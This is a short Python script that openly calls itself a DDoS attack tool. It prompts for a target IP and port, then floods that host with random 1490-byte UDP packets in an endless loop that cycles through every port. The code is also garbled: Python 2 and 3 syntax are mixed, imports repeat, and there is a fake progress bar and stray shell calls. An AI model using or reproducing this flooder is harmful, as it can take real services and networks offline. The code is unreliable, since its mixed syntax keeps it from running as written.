import threading
import requests
import os
# DDoS
import colorama
import threading
import requests
import random
import os
import sys
import time
import undetected_chromedriver
# Colors
yellow='\033[92m'
cyan='\033[92m'
pink='\033[92m'
green = '\033[92m'
red ='\033[92m'
white ='\033[92m'
black ='\033[92m'
# Requests

os.system("clear")
print(green + f"З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

print('''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
print("DDos python script")

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print
print "Author   : HA-MRX"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("Attack Starting")
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(2)
print "[==========          ] 50%"
time.sleep(2)
print "[===============     ] 75%"
time.sleep(2)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
